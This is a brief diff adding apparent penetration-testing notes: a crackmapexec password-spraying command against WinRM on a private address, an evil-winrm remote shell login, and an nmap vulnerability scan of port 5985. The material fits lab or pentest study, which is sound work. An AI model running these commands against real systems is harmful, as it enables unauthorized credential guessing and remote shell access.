@@ -1,0 +1,8 @@
+
+
+crackmapexec winrm 172.25.100.105 -u username.txt -p password.txt
+
+
+evil-winrm -i 172.25.100.105 -u <username> -p <password>
+
+nmap -p 5985 --script vuln,vulners <target_ip>
